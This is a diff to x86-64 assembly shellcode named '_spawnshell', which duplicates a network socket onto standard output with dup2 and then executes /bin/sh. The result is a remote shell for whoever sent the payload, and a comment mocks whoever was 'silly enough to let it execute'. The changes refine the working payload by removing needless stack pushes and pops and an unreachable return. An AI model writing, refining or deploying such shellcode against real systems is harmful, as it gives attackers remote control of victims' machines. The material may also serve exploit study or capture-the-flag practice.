@@ -7,15 +7,12 @@
 # to who/whatever was silly enough to let it execute.
 
 _spawnshell:
-    # Put the socket we downloaded from on the stack
-    push %rdi
-    
     # From Linux manpages 4.04, syscall(2)
     # syscall number in %rax (dup2)
     mov $33, %rax
     
-    # argument 1 in %rdi (the socket which we downloaded the shellcode through)
-    pop %rdi
+    # argument 1 in %rdi already
+    # (the socket which we downloaded the shellcode through)
 
     # argument 2 in %rsi (stdout)
     mov $1, %rsi
@@ -49,9 +46,7 @@ _spawnshell:
 
     syscall
 
-    # cleanup and return (unreached)
-    pop %rdi
-    ret
+    # (this point is unreached)
 shell:
     .ascii "/bin/sh\0"
 shell_end:
